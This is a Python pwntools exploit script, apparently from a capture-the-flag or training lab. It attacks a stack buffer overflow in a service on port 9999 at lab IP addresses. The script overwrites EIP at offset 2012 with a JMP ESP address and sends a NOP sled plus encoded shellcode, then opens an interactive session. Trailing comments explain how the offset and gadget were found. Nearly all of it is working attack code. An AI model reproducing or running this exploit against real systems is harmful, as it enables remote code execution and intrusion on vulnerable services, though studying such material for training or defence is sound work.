#!/usr/bin/env python3
from pwn import *
import os

if os.environ['TARGET']=='REMOTE':
	r = remote('10.10.56.180',9999)
else:
	r = remote('192.168.0.10',9999)

buf = b""
buf+= b"bestNameEver"
r.send(buf+b"\n")
resp = r.recv()
print(str(resp))

eipOffset = 2012
jmp_esp = 0x625014df

buf =  b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buf += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buf += b"\xb8\x36\xb3\xed\x79\xd9\xc5\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x5b\x83\xc5\x04\x31\x45\x10\x03\x45\x10\xd4"
buf += b"\x46\x11\x91\x9a\xa9\xea\x62\xfa\x20\x0f\x53\x3a\x56"
buf += b"\x5b\xc4\x8a\x1c\x09\xe9\x61\x70\xba\x7a\x07\x5d\xcd"
buf += b"\xcb\xad\xbb\xe0\xcc\x9d\xf8\x63\x4f\xdf\x2c\x44\x6e"
buf += b"\x10\x21\x85\xb7\x4c\xc8\xd7\x60\x1b\x7f\xc8\x05\x51"
buf += b"\xbc\x63\x55\x74\xc4\x90\x2e\x77\xe5\x06\x24\x2e\x25"
buf += b"\xa8\xe9\x5b\x6c\xb2\xee\x61\x26\x49\xc4\x1e\xb9\x9b"
buf += b"\x14\xdf\x16\xe2\x98\x12\x66\x22\x1e\xcc\x1d\x5a\x5c"
buf += b"\x71\x26\x99\x1e\xad\xa3\x3a\xb8\x26\x13\xe7\x38\xeb"
buf += b"\xc2\x6c\x36\x40\x80\x2b\x5b\x57\x45\x40\x67\xdc\x68"
buf += b"\x87\xe1\xa6\x4e\x03\xa9\x7d\xee\x12\x17\xd0\x0f\x44"
buf += b"\xf8\x8d\xb5\x0e\x15\xda\xc7\x4c\x72\x2f\xea\x6e\x82"
buf += b"\x27\x7d\x1c\xb0\xe8\xd5\x8a\xf8\x61\xf0\x4d\x88\x65"
buf += b"\x03\x81\x32\xe5\xfd\x22\x43\x2c\x3a\x76\x13\x46\xeb"
buf += b"\xf7\xf8\x96\x14\x22\x94\x9c\x82\xc7\x62\xa2\xbc\xb0"
buf += b"\x76\xa2\x44\x93\xfe\x44\x14\x43\x51\xd8\xd5\x33\x11"
buf += b"\x88\xbd\x59\x9e\xf7\xde\x61\x74\x90\x75\x8e\x21\xc9"
buf += b"\xe1\x37\x68\x81\x90\xb8\xa6\xec\x93\x33\x43\x11\x5d"
buf += b"\xb4\x26\x01\x8a\xa3\xc8\xd9\x4b\x46\xc9\xb3\x4f\xc0"
buf += b"\x9e\x2b\x52\x35\xe8\xf4\xad\x10\x6a\xf2\x52\xe5\x5b"
buf += b"\x89\x65\x73\xe4\xe5\x89\x93\xe4\xf5\xdf\xf9\xe4\x9d"
buf += b"\x87\x59\xb7\xb8\xc7\x77\xab\x11\x52\x78\x9a\xc6\xf5"
buf += b"\x10\x20\x31\x31\xbf\xdb\x14\x41\xb8\x24\xeb\x6e\x61"
buf += b"\x4d\x13\x2f\x91\x8d\x79\xaf\xc1\xe5\x76\x80\xee\xc5"
buf += b"\x77\x0b\xa7\x4d\xf2\xda\x05\xef\x03\xf7\xc8\xb1\x04"
buf += b"\xf4\xd0\x42\x7f\x75\xe6\xa2\x80\x9f\x83\xa2\x81\x9f"
buf += b"\xb5\x9f\x54\xa6\xc3\xde\x65\x9d\xcc\xfc\x43\xe8\x64"
buf += b"\x59\x06\x51\xe9\x5a\xfd\x96\x14\xd9\xf7\x66\xe3\xc1"
buf += b"\x72\x62\xaf\x45\x6f\x1e\xa0\x23\x8f\x8d\xc1\x61"

msg = b""
msg += b"A"*eipOffset
msg += struct.pack("<I",jmp_esp)
msg += buf
r.send(msg+b"\r\n")
resp = r.recv()
print(str(resp))
r.interactive()



#getting offset
# tried to go to 75616164 -> uaad -> cyclic_find(daau) = 2012
# bytearray.fromhex("75616164").decode() -> 2012

#getting jmp esp
#ROPgadget --binary <> | grep "jmp esp"
